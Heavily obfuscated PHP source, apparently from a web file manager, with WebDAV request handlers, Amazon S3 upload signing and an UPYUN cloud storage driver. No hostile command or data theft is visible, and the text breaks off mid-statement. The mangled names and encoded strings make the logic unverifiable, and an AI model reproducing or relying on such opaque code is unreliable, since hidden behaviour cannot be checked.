goto fŠ°«Ğ’‹ª; AÖÑØÊŸƒÏ: return array($aä¬ãƒÁ‚¬[1775] => 207, $aä¬ãƒÁ‚¬[1776] => "\74\104\72\155\165\154\x74\151\x73\164\x61\164\x75\x73\40\170\155\154\x6e\x73\72\x44\75\42\104\x41\126\x3a\x22\x3e\12{$FŸ‘®¶Úğ}\12\74\x2f\x44\72\155\165\154\x74\151\163\x74\141\164\x75\x73\x3e"); goto C›†óùÕˆô; fŠ°«Ğ’‹ª: $aä¬ãƒÁ‚¬ =& $_SERVER[Õİõş]; $fËÇà×í”Ó = $this->pathList($this->path); $EËÆ“‘šƒŒ = $this->pathListMerge($fËÇà×í”Ó); goto dËŸ„§‡¼–; dËŸ„§‡¼–: $d‘ööã®è = $fËÇà×í”Ó[$aä¬ãƒÁ‚¬[1773]]; if (!is_array($EËÆ“‘šƒŒ) || $d‘ööã®è[$aä¬ãƒÁ‚¬[1774]] === !1) { return array($aä¬ãƒÁ‚¬[1775] => 404, $aä¬ãƒÁ‚¬[1776] => $aä¬ãƒÁ‚¬[1777]); } $fãçŠ™ù”“ = $d‘ööã®è[$aä¬ãƒÁ‚¬[29]] == $aä¬ãƒÁ‚¬[163] || HttpHeader::get($aä¬ãƒÁ‚¬[1752]) == $aä¬ãƒÁ‚¬[463]; goto dáó·œö‰; dáó·œö‰: if ($fãçŠ™ù”“) { $EËÆ“‘šƒŒ = array($d‘ööã®è); } else { $d‘ööã®è[$aä¬ãƒÁ‚¬[28]] = $aä¬ãƒÁ‚¬[33]; $EËÆ“‘šƒŒ = array_merge(array($d‘ööã®è), $EËÆ“‘šƒŒ); } $FŸ‘®¶Úğ = $aä¬ãƒÁ‚¬[33]; foreach ($EËÆ“‘šƒŒ as $Eô¯…‡Ğ†È) { $FŸ‘®¶Úğ .= $this->parseItemXml($Eô¯…‡Ğ†È, $fãçŠ™ù”“); } goto AÖÑØÊŸƒÏ; C›†óùÕˆô: } public function httpHEAD() { $f…”ê…î‡¸ =& $_SERVER[Õİõş]; $Fàó½ÜÔ™ = $this->pathInfo($this->path); if (!$Fàó½ÜÔ™ || $Fàó½ÜÔ™[$f…”ê…î‡¸[29]] == $f…”ê…î‡¸[76]) { return array($f…”ê…î‡¸[1035] => 200, $f…”ê…î‡¸[1202] => array($f…”ê…î‡¸[1778])); } return array($f…”ê…î‡¸[1035] => 200, $f…”ê…î‡¸[1202] => array($f…”ê…î‡¸[1779], $f…”ê…î‡¸[135], $f…”ê…î‡¸[1780] . $Fàó½ÜÔ™[$f…”ê…î‡¸[77]], $f…”ê…î‡¸[1781] . get_file_mime($Fàó½ÜÔ™[$f…”ê…î‡¸[156]]), $f…”ê…î‡¸[131] . gmdate($f…”ê…î‡¸[1767], $Fàó½ÜÔ™[$f…”ê…î‡¸[1249]]) . $f…”ê…î‡¸[1782], $f…”ê…î‡¸[1783])); } public function httpOPTIONS() { $a Â–İ…¤ =& $_SERVER[Õİõş]; return array($a Â–İ…¤[1035] => 200, $a Â–İ…¤[1202] => array($a Â–İ…¤[1784], $a Â–İ…¤[1785], $a Â–İ…¤[1786], $a Â–İ…¤[1258])); } public function httpPROPPATCH() { $Eã ê¬Ÿ =& $_SERVER[Õİõş]; $eöäÀšÁê = $Eã ê¬Ÿ[1787] . $_SERVER[$Eã ê¬Ÿ[1368]] . $Eã ê¬Ÿ[1788]; return array($Eã ê¬Ÿ[1775] => 207, $Eã ê¬Ÿ[1776] => "\x3c\x44\x3a\x6d\165\x6c\164\151\x73\x74\141\x74\x75\163\40\170\155\154\156\163\72\104\75\x22\x44\101\x56\x3a\x22\76\12{$eöäÀšÁê}\xa\x3c\x2f\x44\x3a\155\x75\154\x74\151\163\164\141\x74\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $EÔˆ´š‡˜· =& $_SERVER[Õİõş]; $eËÃÀ‘Ó¬Ü = $this->uploadFile(); if ($eËÃÀ‘Ó¬Ü) { $cá¯İÁ±…æ = 204; } else { $eËÃÀ‘Ó¬Ü = $EÔˆ´š‡˜·[33]; $cá¯İÁ±…æ = 201; } $dÃÅ¬¥¢Ê = $this->pathPut($this->path, $eËÃÀ‘Ó¬Ü); if ($dÃÅ¬¥¢Ê == !1) { $cá¯İÁ±…æ = 404; } return array($EÔˆ´š‡˜·[1775] => $cá¯İÁ±…æ); } private function uploadFile() { goto DŸ×öÆÈ¦÷; CºØ§²¿È: $C™ŠïÖñ²í = @fopen($CÜ‡‚¶Ü¿», $Bêª¢šÄß[1497]); $a†ßÕ¸à¤ = @fopen($Bêª¢šÄß[1790], $Bêª¢šÄß[1496]); if (!$a†ßÕ¸à¤ || !$C™ŠïÖñ²í) { @unlink($CÜ‡‚¶Ü¿»); return !1; } goto B¥”„ê…¾; fÖ´òÓ¦Çª: if (@filesize($CÜ‡‚¶Ü¿») > 0) { return $CÜ‡‚¶Ü¿»; } @unlink($CÜ‡‚¶Ü¿»); return !1; goto fÆ‰Í ßˆ; B¥”„ê…¾: while (!feof($a†ßÕ¸à¤)) { fwrite($C™ŠïÖñ²í, fread($a†ßÕ¸à¤, 1024 * 200)); } fclose($a†ßÕ¸à¤); fclose($C™ŠïÖñ²í); goto fÖ´òÓ¦Çª; DŸ×öÆÈ¦÷: $Bêª¢šÄß =& $_SERVER[Õİõş]; @mk_dir(TEMP_FILES); $CÜ‡‚¶Ü¿» = TEMP_FILES . $Bêª¢šÄß[1789] . rand_string(32); goto CºØ§²¿È; fÆ‰Í ßˆ: } public function httpMKCOL() { $Cá§™¹ø‰ =& $_SERVER[Õİõş]; if ($this->pathExists($this->path)) { return array($Cá§™¹ø‰[1035] => 409); } $fó¯›Ó˜¼ = $this->pathMkdir($this->path); return array($Cá§™¹ø‰[1035] => $fó¯›Ó˜¼ ? 201 : 403); } public function httpMOVE() { $e™ïÉå±Ø =& $_SERVER[Õİõş]; $b¾ ô…‡â™ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$e™ïÉå±Ø[1791]])) { $B©Š†ÀïĞğ[$e™ïÉå±Ø[1792]] = $_SERVER[$e™ïÉå±Ø[1791]] == $e™ïÉå±Ø[1793]; } $Cµ®Ñ–¦Î = $this->pathMove($this->path, $b¾ ô…‡â™); return array($e™ïÉå±Ø[1035] => $Cµ®Ñ–¦Î ? 201 : 404); } public function httpCOPY() { $E£ùÓå‰¦ä = $this->parsePath($this->pathGet(!0)); $cÔìÈ©ÈË = $this->pathCopy($this->path, $E£ùÓå‰¦ä); return array($_SERVER[Õİõş][1035] => $cÔìÈ©ÈË ? 201 : 404); } public function httpDELETE() { $cù©™ÎÈƒ‘ = $this->pathRemove($this->path); return array($_SERVER[Õİõş][1035] => $cù©™ÎÈƒ‘ ? 200 : 503); } public function httpLOCK() { $FÃÓ×ÜŸ¼ƒ =& $_SERVER[Õİõş]; $DºŸœ©¶ìÏ = md5($this->path); $FÑ„›Ë¸Ÿ‡ = $FÃÓ×ÜŸ¼ƒ[1794] . $this->xmlGet($FÃÓ×ÜŸ¼ƒ[1795]) . $FÃÓ×ÜŸ¼ƒ[1796] . $DºŸœ©¶ìÏ . $FÃÓ×ÜŸ¼ƒ[1797]; return array($FÃÓ×ÜŸ¼ƒ[1035] => 200, $FÃÓ×ÜŸ¼ƒ[1202] => array($FÃÓ×ÜŸ¼ƒ[1798] . $DºŸœ©¶ìÏ, $FÃÓ×ÜŸ¼ƒ[1799]), $FÃÓ×ÜŸ¼ƒ[1800] => $FÑ„›Ë¸Ÿ‡); } public function httpUNLOCK() { return array($_SERVER[Õİõş][1035] => 204); } public function xmlGet($C¶ÌğÇõñÆ) { goto FŸƒ„íÓé¤; Dò‡³íªÄó: $dçÛ„ÇÅ— = array_shift(explode($c¾åÈà¾¯ò[8], $C¶ÌğÇõñÆ)); $eËäŞÚÏÛŒ = $d¬•´öğÓ->getElementsByTagNameNS($c¾åÈà¾¯ò[1802], $dçÛ„ÇÅ—); if ($eËäŞÚÏÛŒ) { return $eËäŞÚÏÛŒ[0]->nodeValue; } goto eÃˆ¿º‰é‘; FŸƒ„íÓé¤: $c¾åÈà¾¯ò =& $_SERVER[Õİõş]; static $d¬•´öğÓ = false; if (!$d¬•´öğÓ) { $c­²¶¼ºáÌ = file_get_contents($c¾åÈà¾¯ò[1801]); $d¬•´öğÓ = new DOMDocument(); $d¬•´öğÓ->loadXML($c­²¶¼ºáÌ); } goto Dò‡³íªÄó; eÃˆ¿º‰é‘: return $c¾åÈà¾¯ò[33]; goto CÀëÕ‰ßÊ; CÀëÕ‰ßÊ: } public static function response($AÈ‹ô¤Ú¸¹) { goto B‚ß±ó¼ˆÁ; B‚ß±ó¼ˆÁ: $BÓ††°‹ÌÊ =& $_SERVER[Õİõş]; $B›§Í¥«È = is_array($AÈ‹ô¤Ú¸¹[$BÓ††°‹ÌÊ[1202]]) ? $AÈ‹ô¤Ú¸¹[$BÓ††°‹ÌÊ[1202]] : array(); $B›§Í¥«È[] = HttpHeader::code($AÈ‹ô¤Ú¸¹[$BÓ††°‹ÌÊ[1035]]); goto Cƒ‡È²¸“£; aØ×ÖÇš¶ : if (is_string($AÈ‹ô¤Ú¸¹[$BÓ††°‹ÌÊ[1800]])) { header($BÓ††°‹ÌÊ[1803]); $AØ“ˆ‚¶ò = $BÓ††°‹ÌÊ[1804] . $BÓ††°‹ÌÊ[213] . $AÈ‹ô¤Ú¸¹[$BÓ††°‹ÌÊ[1800]]; echo $AØ“ˆ‚¶ò; } goto bÜÎŠÑ†Ğ¿; Cƒ‡È²¸“£: $B›§Í¥«È[] = $BÓ††°‹ÌÊ[1742]; $B›§Í¥«È[] = $BÓ††°‹ÌÊ[1743]; foreach ($B›§Í¥«È as $B‚Èš½äÔì) { header($B‚Èš½äÔì); } goto aØ×ÖÇš¶ ; bÜÎŠÑ†Ğ¿: } } goto BÁˆŞÈ¬Ô»; BŠİ¿§¯ —: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Eì†¹ÈÊŠ„) { parent::__construct($Eì†¹ÈÊŠ„); } public function uploadFormData($CÄÂöÁ•›ì, $c¹®¿©‡÷ = 3600) { goto cæñ×¨Ø»…; cêï¼ŸŠƒ­: $dâçŒ½» = $a˜Ó —•¢[59]; $C†…ÄÏ„² = gmdate($a˜Ó —•¢[1130]); $cŒ•×Ø²½ = gmdate($a˜Ó —•¢[692]); goto Cî¸‘†çğ˜; a á¦ë×„¨: $Eš¸²˜ ä = base64_encode(json_encode($A•»öï«½)); $bŠè…ŞÍòª = hash_hmac($a˜Ó —•¢[1139], $cŒ•×Ø²½, $a˜Ó —•¢[1140] . $this->secret, !0); $EŠª‡‡àõ = hash_hmac($a˜Ó —•¢[1139], $this->region, $bŠè…ŞÍòª, !0); goto fŸàáÓ›•; c«Åò¼êÄ—: $B„’æÊˆÜĞ = array($a˜Ó —•¢[195] => $a˜Ó —•¢[33], $a˜Ó —•¢[1141] => $a˜Ó —•¢[33], $a˜Ó —•¢[1100] => $A‚²÷Âä, $a˜Ó —•¢[1104] => $A®®À‘Âèé, $a˜Ó —•¢[1108] => $Eš¸²˜ ä, $a˜Ó —•¢[1142] => $B‹¸…§‘ê, $a˜Ó —•¢[1143] => $Bí¦ºóŸŒÜ, $a˜Ó —•¢[1144] => $C†…ÄÏ„², $a˜Ó —•¢[1145] => $EìŒÅ°“‘, $a˜Ó —•¢[1146] => $B°ºÃğîµ…, $a˜Ó —•¢[165] => $this->getHost()); return $B„’æÊˆÜĞ; goto AÁÁ‚Á‡Áà; fŸàáÓ›•: $BÀĞÙÑÛê = hash_hmac($a˜Ó —•¢[1139], $dâçŒ½», $EŠª‡‡àõ, !0); $fÆ¼ƒÉÇ¹ô = hash_hmac($a˜Ó —•¢[1139], $fÕ™Ó‡·ïé, $BÀĞÙÑÛê, !0); $B°ºÃğîµ… = hash_hmac($a˜Ó —•¢[1139], $Eš¸²˜ ä, $fÆ¼ƒÉÇ¹ô); goto c«Åò¼êÄ—; A—Ö‡‘‘é±: $dï…“õ´ï¸ = array($this->accessKey, $cŒ•×Ø²½, $this->region, $dâçŒ½», $fÕ™Ó‡·ïé); $B‹¸…§‘ê = implode($a˜Ó —•¢[8], $dï…“õ´ï¸); $A•»öï«½ = array($a˜Ó —•¢[1098] => gmdate($a˜Ó —•¢[1097], strtotime($a˜Ó —•¢[1132])), $a˜Ó —•¢[1099] => array(array($a˜Ó —•¢[1101] => $this->bucket), array($a˜Ó —•¢[1100] => $A‚²÷Âä), array($a˜Ó —•¢[1102], $a˜Ó —•¢[1103], $a˜Ó —•¢[33]), array($a˜Ó —•¢[1102], $a˜Ó —•¢[1133], $a˜Ó —•¢[33]), array($a˜Ó —•¢[1102], $a˜Ó —•¢[1134], $a˜Ó —•¢[33]), array($a˜Ó —•¢[1104] => $A®®À‘Âèé), array($a˜Ó —•¢[1135] => $B‹¸…§‘ê), array($a˜Ó —•¢[1136] => $Bí¦ºóŸŒÜ), array($a˜Ó —•¢[1137] => $C†…ÄÏ„²), array($a˜Ó —•¢[1138] => $EìŒÅ°“‘))); goto a á¦ë×„¨; Cî¸‘†çğ˜: $fÕ™Ó‡·ïé = $a˜Ó —•¢[1131]; $EìŒÅ°“‘ = $c¹®¿©‡÷ . $a˜Ó —•¢[33]; $A®®À‘Âèé = $a˜Ó —•¢[1096]; goto A—Ö‡‘‘é±; cæñ×¨Ø»…: $a˜Ó —•¢ =& $_SERVER[Õİõş]; $A‚²÷Âä = $a˜Ó —•¢[181]; $Bí¦ºóŸŒÜ = $a˜Ó —•¢[1129]; goto cêï¼ŸŠƒ­; AÁÁ‚Á‡Áà: } public function multiUploadFormData($c‡±á¨…Òİ, $bšÖ§ë‘ = 3600) { $DÊèÎ£»‹ù =& $_SERVER[Õİõş]; $Dà¢õ‹’¡ù = gmdate($DÊèÎ£»‹ù[1225]); $b™Æµ¥…‚ = array(); $dğ ¾ˆÅÊ = $this->client->getUploadId($this->bucket, $c‡±á¨…Òİ, $b™Æµ¥…‚); if (!$dğ ¾ˆÅÊ) { return !1; } return array($DÊèÎ£»‹ù[205] => $dğ ¾ˆÅÊ, $DÊèÎ£»‹ù[165] => $this->getHost() . $DÊèÎ£»‹ù[8] . $this->pathEncode($c‡±á¨…Òİ), $DÊèÎ£»‹ù[206] => $Dà¢õ‹’¡ù, $DÊèÎ£»‹ù[89] => $c‡±á¨…Òİ); } public function multiUploadAuthData($a¨·ƒ„›ê¨, $d‹Ù‘ ˆ = array()) { goto aó°šÏÂ´Ø; fŠàñ÷‘×Ä: $d±ö¶­°‰ = $FÊë†’ªŠ¶[210]; $dó¦Ê¸çµ¹ = $FÊë†’ªŠ¶[8] . $this->pathEncode($E•ÔÍè½) . $a¬–š’Ë´Ø; $c”‚äÇÖ…‡ = $this->client->__getSignatureV4($D¿Ñ¹š’ö‘, $dâÍí¬ê†é, $d±ö¶­°‰, $dó¦Ê¸çµ¹); goto dĞÊëèÜæö; aó°šÏÂ´Ø: $FÊë†’ªŠ¶ =& $_SERVER[Õİõş]; $a¬–š’Ë´Ø = isset($d‹Ù‘ ˆ[$FÊë†’ªŠ¶[156]]) ? $d‹Ù‘ ˆ[$FÊë†’ªŠ¶[156]] : $FÊë†’ªŠ¶[33]; $E•ÔÍè½ = $d‹Ù‘ ˆ[$FÊë†’ªŠ¶[89]]; goto D‡Æ«ìÎÊ“; dÈ¯°øÙµ®: if (isset($d‹Ù‘ ˆ[$FÊë†’ªŠ¶[1226]])) { $D¿Ñ¹š’ö‘[$FÊë†’ªŠ¶[1227]] = $d‹Ù‘ ˆ[$FÊë†’ªŠ¶[1226]]; } $bá¾Ü×ŸÂ‹ = explode($FÊë†’ªŠ¶[167], $this->getHost()); $dâÍí¬ê†é = array($FÊë†’ªŠ¶[1228] => $bá¾Ü×ŸÂ‹[1], $FÊë†’ªŠ¶[1229] => $FÊë†’ªŠ¶[33], $FÊë†’ªŠ¶[195] => $FÊë†’ªŠ¶[115], $FÊë†’ªŠ¶[1141] => $d‹Ù‘ ˆ[$FÊë†’ªŠ¶[77]]); goto fŠàñ÷‘×Ä; D‡Æ«ìÎÊ“: unset($d‹Ù‘ ˆ[$FÊë†’ªŠ¶[89]]); if (isset($d‹Ù‘ ˆ[$FÊë†’ªŠ¶[207]])) { return $this->listUploadParts($E•ÔÍè½, $d‹Ù‘ ˆ); } $D¿Ñ¹š’ö‘ = array(); goto dÈ¯°øÙµ®; dĞÊëèÜæö: if (strpos($a¬–š’Ë´Ø, $FÊë†’ªŠ¶[209]) === 0) { if (isset($D¿Ñ¹š’ö‘[$FÊë†’ªŠ¶[1227]])) { $f™ë¡«ŒÆÑ = $D¿Ñ¹š’ö‘[$FÊë†’ªŠ¶[1227]]; } else { if (isset($c”‚äÇÖ…‡[$FÊë†’ªŠ¶[1227]])) { $f™ë¡«ŒÆÑ = $c”‚äÇÖ…‡[$FÊë†’ªŠ¶[1227]]; } else { $f™ë¡«ŒÆÑ = hash($FÊë†’ªŠ¶[1139], $FÊë†’ªŠ¶[33]); } } return array($FÊë†’ªŠ¶[216] => $c”‚äÇÖ…‡[$FÊë†’ªŠ¶[216]], $FÊë†’ªŠ¶[1227] => $f™ë¡«ŒÆÑ, $FÊë†’ªŠ¶[206] => $c”‚äÇÖ…‡[$FÊë†’ªŠ¶[1230]]); } return $c”‚äÇÖ…‡[$FÊë†’ªŠ¶[216]]; goto câ¦¥…¨Õ“; câ¦¥…¨Õ“: } public function listUploadParts($cÌ¼®ó¯Œ¾, $e ÌØ¤Ñœ = array()) { goto aÁ½ùøµÑ–; D˜é·¯ÚÜò: if (!$bˆç…ªƒ) { return !1; } $F×Ñ‹­ŠĞİ = $FÍ´ğ¿ÓÉ»[1231]; foreach ($bˆç…ªƒ as $eÈÏ¶£ù×) { $F×Ñ‹­ŠĞİ .= $FÍ´ğ¿ÓÉ»[1232] . "\74\120\141\162\x74\116\165\155\142\x65\x72\76{$eÈÏ¶£ù×[$FÍ´ğ¿ÓÉ»[1183]]}\x3c\57\120\141\x72\x74\x4e\165\x6d\142\x65\162\76\12" . "\74\x45\x54\141\147\76{$eÈÏ¶£ù×[$FÍ´ğ¿ÓÉ»[1184]]}\74\x2f\x45\x54\141\147\76\xa" . $FÍ´ğ¿ÓÉ»[1233]; } goto A‘ß÷òÖœ¤; aÁ½ùøµÑ–: $FÍ´ğ¿ÓÉ» =& $_SERVER[Õİõş]; $Bõ×²×–îì = str_replace($FÍ´ğ¿ÓÉ»[217], $FÍ´ğ¿ÓÉ»[33], $e ÌØ¤Ñœ[$FÍ´ğ¿ÓÉ»[156]]); $bˆç…ªƒ = $this->client->listParts($this->bucket, $cÌ¼®ó¯Œ¾, $Bõ×²×–îì); goto D˜é·¯ÚÜò; A‘ß÷òÖœ¤: $F×Ñ‹­ŠĞİ .= $FÍ´ğ¿ÓÉ»[1234]; $Dµƒ İàº = array(); $E·è¢…¥£÷ = explode($FÍ´ğ¿ÓÉ»[167], $this->getHost()); goto e³Œ×è¯ÃÚ; e³Œ×è¯ÃÚ: $Dî‡‚Œº®ï = array($FÍ´ğ¿ÓÉ»[1228] => $E·è¢…¥£÷[1], $FÍ´ğ¿ÓÉ»[195] => $FÍ´ğ¿ÓÉ»[115], $FÍ´ğ¿ÓÉ»[1141] => strlen($F×Ñ‹­ŠĞİ)); $dˆ§– ŠŞ“ = $FÍ´ğ¿ÓÉ»[208]; $e¨Øğ½ìÆã = $FÍ´ğ¿ÓÉ»[8] . $this->pathEncode($cÌ¼®ó¯Œ¾) . $e ÌØ¤Ñœ[$FÍ´ğ¿ÓÉ»[156]]; goto cÆÛãÙ£ğÒ; cÆÛãÙ£ğÒ: $d–¾¿Æ°ÌÒ = $this->client->__getSignatureV4($Dµƒ İàº, $Dî‡‚Œº®ï, $dˆ§– ŠŞ“, $e¨Øğ½ìÆã, $F×Ñ‹­ŠĞİ); return array($FÍ´ğ¿ÓÉ»[216] => $d–¾¿Æ°ÌÒ[$FÍ´ğ¿ÓÉ»[216]], $FÍ´ğ¿ÓÉ»[206] => $d–¾¿Æ°ÌÒ[$FÍ´ğ¿ÓÉ»[1230]], $FÍ´ğ¿ÓÉ»[218] => $bˆç…ªƒ, $FÍ´ğ¿ÓÉ»[1227] => $d–¾¿Æ°ÌÒ[$FÍ´ğ¿ÓÉ»[1227]]); goto CòÁí±Î¶Ÿ; CòÁí±Î¶Ÿ: } public function link($B†¸Ï²—, $eó ¤ôäªÏ = array()) { return parent::link($B†¸Ï²—, $eó ¤ôäªÏ); } public function fileOut($F¥ˆİ›ğ½, $dƒï«óÂ‡ = false, $a¼‡÷‚¥±š = false, $eº…ã£Š‰Ü = '') { if (strstr($this->endpoint, $_SERVER[Õİõş][1235])) { return parent::fileOutServer($F¥ˆİ›ğ½, $dƒï«óÂ‡, $a¼‡÷‚¥±š, $eº…ã£Š‰Ü); } parent::fileOut($F¥ˆİ›ğ½, $dƒï«óÂ‡, $a¼‡÷‚¥±š, $eº…ã£Š‰Ü); } public function fileOutImage($cÆì »Ğ‹», $fŸë‹›ÖÉÕ = 250) { if (strstr($this->endpoint, $_SERVER[Õİõş][1235])) { return parent::fileOutImageServer($cÆì »Ğ‹», $fŸë‹›ÖÉÕ); } parent::fileOutImage($cÆì »Ğ‹», $fŸë‹›ÖÉÕ); } public function fileOutLink($A·„ëó¢¹¸) { $dÒİ‘·Á =& $_SERVER[Õİõş]; if (substr($A·„ëó¢¹¸, 0, 7) == $dÒİ‘·Á[1111]) { $A·„ëó¢¹¸ = $dÒİ‘·Á[1112] . substr($A·„ëó¢¹¸, 7); } header($dÒİ‘·Á[152] . $A·„ëó¢¹¸); die; } public function getHost() { $Aíß—Ü¦¥¾ =& $_SERVER[Õİõş]; $cï¶Úƒè¾ = str_rtrim(parent::getHost(), $Aíß—Ü¦¥¾[8] . $this->bucket); $cï¶Úƒè¾ = explode($Aíß—Ü¦¥¾[167], $cï¶Úƒè¾); return $cï¶Úƒè¾[0] . $Aíß—Ü¦¥¾[167] . $this->bucket . $Aíß—Ü¦¥¾[91] . $cï¶Úƒè¾[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($F»â´©Š·è, $EÖ÷¡òÜ¿ = 0) { parent::__construct(); $this->source = $F»â´©Š·è; $this->sourceSize = $EÖ÷¡òÜ¿; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($C“óº©½‚¯ = false) { return $this->sourceSize; } public function getContent($eì¾Ò’‡Šø = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $f‡³â³óñ› = ftell($this->source); $E”òÁéØÔ = @fread($this->source, $this->sourceSize); fseek($this->source, $f‡³â³óñ›); return $E”òÁéØÔ; } } public function fileSubstr($CŒÇÖ“„Á = false, $Eµ×îÔ¹ÒÉ = 0, $fòÏºğ°š÷ = 0) { if (!$fòÏºğ°š÷) { $fòÏºğ°š÷ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Eµ×îÔ¹ÒÉ, $fòÏºğ°š÷); } if ($this->sourceType == self::TYPE_FILE) { $Få‘Øéôãİ = ftell($this->source); fseek($this->source, $Få‘Øéôãİ + $Eµ×îÔ¹ÒÉ); $FÂÂ‘äÛÕç = @fread($this->source, $fòÏºğ°š÷); fseek($this->source, $Få‘Øéôãİ); return $FÂÂ‘äÛÕç; } } public function hashMd5($E „ªùˆ· = false) { return md5($this->getContent()); } public static function hash($fÆÔÉ–ºÚÕ, $FïÆäºÛæ‰ = 0) { $BøÂğİìæÉ = new PathDriverStream($fÆÔÉ–ºÚÕ, $FïÆäºÛæ‰); return $BøÂğİìæÉ->hashSimple($fÆÔÉ–ºÚÕ); } public static function md5($Eà¥×›¸õ©, $D¼¸ù…Ÿ«ó = 0) { $E²™»³àŠ§ = new PathDriverStream($Eà¥×›¸õ©, $D¼¸ù…Ÿ«ó); return $E²™»³àŠ§->hashMd5($Eà¥×›¸õ©); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\57\57\166\60\x2e\141\x70\151\x2e\x75\160\x79\165\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($F°À°‘¥Ñ³) { parent::__construct(); $this->_init($F°À°‘¥Ñ³); } public function _init($f…ÖíÕ“Ñî) { foreach ($f…ÖíÕ“Ñî as $A›Š‰›Æå => $DŠŸì´Æåò) { if (isset($this->{$A›Š‰›Æå})) { $this->{$A›Š‰›Æå} = $DŠŸì´Æåò; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Õİõş][1236], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Eïùîƒ¬àØ, $B™‘˜“Î÷® = "\107\105\x54") { $bèå»Ó‰Üø =& $_SERVER[Õİõş]; $FËÓ„«äƒ = gmdate($bèå»Ó‰Üø[1200]); $d§ÚÔ“¬Í” = base64_encode(hash_hmac($bèå»Ó‰Üø[1237], "{$B™‘˜“Î÷®}\46{$Eïùîƒ¬àØ}\x26{$FËÓ„«äƒ}", md5("{$this->userpass}"), !0)); $bİ‹¶Àëá‰ = array("\x41\x75\164\150\157\162\151\172\141\164\151\x6f\156\x3a\125\120\x59\x55\x4e\x20{$this->username}\72{$d§ÚÔ“¬Í”}", "\104\x61\164\145\72{$FËÓ„«äƒ}"); return $bİ‹¶Àëá‰; } public function ussRequest($aÙŠŠ…ØÉ, $EâÊ¶Ë™¶Š = "\107\105\124", $A„¬İ½¹ß = false, $bŞù›èñ¤Ü = false, $a¿š–Å¦’‡ = false) { goto Aê…à¦‹Ã; Aê…à¦‹Ã: $bÂÒ«œ˜ˆö =& $_SERVER[Õİõş]; $aÙŠŠ…ØÉ = trim($aÙŠŠ…ØÉ, $bÂÒ«œ˜ˆö[8]); $F‰î¸Ë¹¿Õ = "\57{$this->bucket}\x2f{$aÙŠŠ…ØÉ}"; goto cŸÍ™…´¥ì; cŸÍ™…´¥ì: $D¡‰¸½Ã•— = $this->ussHeaders($F‰î¸Ë¹¿Õ, $EâÊ¶Ë™¶Š); if ($bŞù›èñ¤Ü) { $D¡‰¸½Ã•— = array_merge($D¡‰¸½Ã•—, $bŞù›èñ¤Ü); } $dºÊíŒêõß = url_request($this->endpoint . $F‰î¸Ë¹¿Õ, $EâÊ¶Ë™¶Š, $A„¬İ½¹ß, $D¡‰¸½Ã•—, $a¿š–Å¦’‡); goto cËÎàŒµ–˜; cËÎàŒµ–˜: if (!$dºÊíŒêõß) { return array($bÂÒ«œ˜ˆö[1035] => !1, $bÂÒ«œ˜ˆö[1037] => $bÂÒ«œ˜ˆö[1238]); } if (strtolower($EâÊ¶Ë™¶Š) == $bÂÒ«œ˜ˆö[180] || in_array($dºÊíŒêõß[$bÂÒ«œ˜ˆö[1035]], array($bÂÒ«œ˜ˆö[1096], $bÂÒ«œ˜ˆö[1239]))) { $A„¬İ½¹ß = $dºÊíŒêõß[$bÂÒ«œ˜ˆö[1240]]; } else { $A„¬İ½¹ß = json_decode($dºÊíŒêõß[$bÂÒ«œ˜ˆö[1037]], !0); if (!$A„¬İ½¹ß) { $A„¬İ½¹ß = $dºÊíŒêõß[$bÂÒ«œ˜ˆö[1037]]; } else { if (!$dºÊíŒêõß[$bÂÒ«œ˜ˆö[691]] && isset($A„¬İ½¹ß[$bÂÒ«œ˜ˆö[1241]])) { $A„¬İ½¹ß = $A„¬İ½¹ß[$bÂÒ«œ˜ˆö[1241]]; } } } return array($bÂÒ«œ˜ˆö[1035] => $dºÊíŒêõß[$bÂÒ«œ˜ˆö[691]], $bÂÒ«œ˜ˆö[1037] => $A„¬İ½¹ß); goto b¸§öÀ­‡÷; b¸§öÀ­‡÷: } public function mkfile($F¬Éç†£¹‚, $D‡Òì‡Ó´² = '', $e‰ˆòøˆ = REPEAT_RENAME) { if ($this->setContent($F¬Éç†£¹‚, $D‡Òì‡Ó´²)) { return $this->getPathOuter($F¬Éç†£¹‚); } return !1; } public function mkdir($aó¢¬¬³, $Bóš¯åî± = REPEAT_SKIP) { $b½ö­ÕÏÉè =& $_SERVER[Õİõş]; $EŠ‡—îŸ‘š = trim($aó¢¬¬³, $b½ö­ÕÏÉè[8]); if ($this->_isFolder($EŠ‡—îŸ‘š)) { return $this->getPathOuter($EŠ‡—îŸ‘š); } $fçÏêÄò¨â = array($b½ö­ÕÏÉè[1242]); $DæñÃ²Àõ = $this->ussRequest($EŠ‡—îŸ‘š, $b½ö­ÕÏÉè[208], !1, $fçÏêÄò¨â); return $DæñÃ²Àõ[$b½ö­ÕÏÉè[1035]] ? $this->getPathOuter($EŠ‡—îŸ‘š) : !1; } public function copyFile($d‚ö§ò ®Ë, $c³µ·½¦) { $cÂµÅ¤¨¦ê =& $_SERVER[Õİõş]; $eÆöº¶ÃÁ = array($cÂµÅ¤¨¦ê[1243] . "\57{$this->bucket}\x2f{$d‚ö§ò ®Ë}", $cÂµÅ¤¨¦ê[1244]); $CòÔĞÔ”¢İ = $this->ussRequest($c³µ·½¦, $cÂµÅ¤¨¦ê[210], !1, $eÆöº¶ÃÁ); return $CòÔĞÔ”¢İ[$cÂµÅ¤¨¦ê[1035]] ? !0 : !1; } public function moveFile($CæÎ“¡µ§, $dšáº·) { $dğ˜Ä¥´Î =& $_SERVER[Õİõş]; $bƒ‰˜Äò±Ñ = array($dğ˜Ä¥´Î[1245] . "\x2f{$this->bucket}\57{$CæÎ“¡µ§}", $dğ˜Ä¥´Î[1244]); $Aí÷ÚçµÍ‹ = 